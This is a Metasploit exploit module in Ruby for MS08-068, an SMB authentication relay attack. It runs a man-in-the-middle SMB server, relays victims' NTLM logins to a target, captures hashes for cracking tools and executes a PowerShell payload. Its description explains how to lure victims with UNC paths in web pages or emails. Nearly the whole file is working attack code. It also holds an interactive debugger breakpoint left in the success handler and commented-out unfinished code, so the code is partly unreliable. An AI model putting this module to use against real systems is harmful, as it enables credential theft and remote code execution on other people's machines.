##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

=begin
Windows XP systems that are not part of a domain default to treating all
network logons as if they were Guest. This prevents SMB relay attacks from
gaining administrative access to these systems. This setting can be found
under:

  Local Security Settings >
   Local Policies >
    Security Options >
     Network Access: Sharing and security model for local accounts
=end

require 'ruby_smb'
require 'ruby_smb/mitm_server'
require 'ruby_smb/mitm_server_client'
require 'ruby_smb/gss/provider/ntlm'
require 'metasploit/framework/hashes/identify'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include ::Msf::Exploit::SMBHashCapture
  include ::Msf::Exploit::Remote::SMB::Client::Psexec
  include ::Msf::Exploit::Powershell

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'MS08-068 Microsoft Windows SMB Relay Code Execution',
      'Description'    => %q{
          This module will relay SMB authentication requests to another
        host, gaining access to an authenticated SMB session if successful.
        If the connecting user is an administrator and network logins are
        allowed to the target machine, this module will execute an arbitrary
        payload. To exploit this, the target system	must try to	authenticate
        to this module. The easiest way to force a SMB authentication attempt
        is by embedding a UNC path (\\\\SERVER\\SHARE) into a web page or
        email message. When the victim views the web page or email, their
        system will automatically connect to the server specified in the UNC
        share (the IP address of the system running this module) and attempt
        to authenticate.  Unfortunately, this
        module is not able to clean up after itself. The service and payload
        file listed in the output will need to be manually removed after access
        has been gained. The service created by this tool uses a randomly chosen
        name and description, so the services list can become cluttered after
        repeated exploitation.

        The SMB authentication relay attack was first reported by Sir Dystic on
        March 31st, 2001 at @lanta.con in Atlanta, Georgia.

        On November 11th 2008 Microsoft released bulletin MS08-068. This bulletin
        includes a patch which prevents the relaying of challenge keys back to
        the host which issued them, preventing this exploit from working in
        the default configuration. It is still possible to set the SMBHOST
        parameter to a third-party host that the victim is authorized to access,
        but the "reflection" attack has been effectively broken.
      },
      'Author'         =>
        [
          'hdm', # All the work
          'juan vazquez' # Add NTLMSSP support to the exploit
        ],
      'License'        => MSF_LICENSE,
      'Privileged'     => true,
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread'
        },
      'Payload'        =>
        {
          'Space'        => 2048,
          'DisableNops'  => true,
          'StackAdjustment' => -3500,
        },
      'References'     =>
        [
          [ 'CVE', '2008-4037'],
          [ 'OSVDB', '49736'],
          [ 'MSB', 'MS08-068'],
          [ 'URL', 'http://blogs.technet.com/swi/archive/2008/11/11/smb-credential-reflection.aspx'],
          [ 'URL', 'http://en.wikipedia.org/wiki/SMBRelay' ],
          [ 'URL', 'http://technet.microsoft.com/en-us/sysinternals/bb897553.aspx' ]
        ],
      'Arch'           => [ARCH_X86, ARCH_X64],
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'Automatic', { } ],
        ],
      'DisclosureDate' => '2001-03-31',
      'DefaultTarget'  => 0,
      'Actions' => [[ 'Capture', { 'Description' => 'Run SMB MITM server' } ]],
      'PassiveActions' => [ 'Capture' ],
      'DefaultAction' => 'Capture'))

    register_options(
      [
        OptAddress.new('PEERHOST', [ true, "The target SMB server IP Address"]),
        OptInt.new('PEERPORT', [ true, "The target SMB server port", 445]),
        OptAddressLocal.new('SRVHOST', [true, 'The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.']),
        OptPort.new('SRVPORT', [ true, 'The local port to listen on.', 445 ]),
        OptString.new('SHARE',    [ true, "The share to connect to", 'ADMIN$' ]),
        OptString.new('CAINPWFILE', [ false, 'Name of file to store Cain&Abel hashes in. Only supports NTLMv1 hashes. Can be a path.', nil ]),
        OptString.new('JOHNPWFILE', [ false, 'Name of file to store JohnTheRipper hashes in. Supports NTLMv1 and NTLMv2 hashes, each of which is stored in separate files. Can also be a path.', nil ]),
        OptString.new('SMBDomain', [ true, 'The domain name used during SMB exchange.', 'WORKGROUP'], aliases: ['DOMAIN_NAME']),
        OptInt.new('TIMEOUT', [ true, 'Seconds that the server socket will wait for a response after the client has initiated communication.', 5])
      ])

    deregister_options('RPORT', 'RHOSTS', 'SMBPass', 'SMBUser')

  end


  # class RelayNTLMProvider < RubySMB::Gss::Provider::NTLM
  #   def initialize(allow_anonymous: false, default_domain: 'WORKGROUP', listener: nil)
  #     super(allow_anonymous: allow_anonymous, default_domain: default_domain)
  #     @listener = listener
  #   end
  #
  #   class MITMAuthenticator < ::Msf::Exploit::SMBHashCapture::HashCaptureAuthenticator
  #     def bin_to_hex(str)
  #       str.each_byte.map { |b| b.to_s(16).rjust(2, '0') }.join
  #     end
  #
  #     def relay_ntlm_type1(type1_msg)
  #       # @client_os_version = type1_msg.os_version
  #       # TODO: write method for mapping +major+ and +minor+ OS values to human-readable OS names.
  #       # @client_os_version = ::NTLM::OSVersion.read(type1_msg.os_version)
  #
  #       @provider.listener.relay_type1(type1_msg.sec_buff)
  #     end
  #   end
  #
  #   # Needs overwritten to ensure our version of Authenticator is returned
  #   def new_authenticator(server_client)
  #     # build and return an instance that can process and track stateful information for a particular connection but
  #     # that's backed by this particular provider
  #     # IN this case that means a Authenticator that supports hash capture and pass the hash functionality
  #     MITMAuthenticator.new(self, server_client)
  #   end
  #
  #   attr_reader :listener
  # end

  def exploit
    @rsock = Rex::Socket::Tcp.create(
      'LocalHost' => datastore['SRVHOST'],
      'LocalPort' => datastore['SRVPORT'],
      'Server' => true,
      'Timeout' => datastore['TIMEOUT'],
      'Context' =>
        {
          'Msf' => framework,
          'MsfExploit' => self
        }
    )

    ntlm_provider = ::Msf::Exploit::Remote::SMB::RubySMBMITMProvider.new(
      peer_host: datastore['PEERHOST'],
      peer_port: datastore['PEERPORT'],
      local_host: datastore['SRVHOST'],
      timeout: datastore['TIMEOUT'],
      default_domain: datastore['SMBDomain'],
      listener: self
    )

    # Set domain name for all future server responses
    ntlm_provider.dns_domain = datastore['SMBDomain']
    ntlm_provider.dns_hostname = datastore['SMBDomain']
    ntlm_provider.netbios_domain = datastore['SMBDomain']
    ntlm_provider.netbios_hostname = datastore['SMBDomain']

    handle_datastore_options(datastore, ntlm_provider)

    server = ::RubySMB::MITMServer.new(
      server_sock: @rsock,
      gss_provider: ntlm_provider
    )

    print_status("Server is running. Listening on #{datastore['SRVHOST']}:#{datastore['SRVPORT']}")

    server.run do
      print_line
      print_good 'Received SMB connection on Auth Capture Server!'
      true
    end
  end

  def on_relay_success(conn)
    self.datastore['RHOST'] = self.datastore['PEERHOST']
    self.datastore['RPORT'] = self.datastore['PEERPORT']

    require 'pry'
    binding.pry

    self.simple = ::Rex::Proto::SMB::SimpleClient.new(conn.dispatcher.tcp_socket, client: conn)

    self.execute_powershell_payload
  end

  def cleanup

    #TODO MAKE MORE SPECIFIC

    begin
      @rsock.close if @rsock
    rescue => e
      elog('Failed closing SMB server socket', error: e)
    end

    super
  end



end
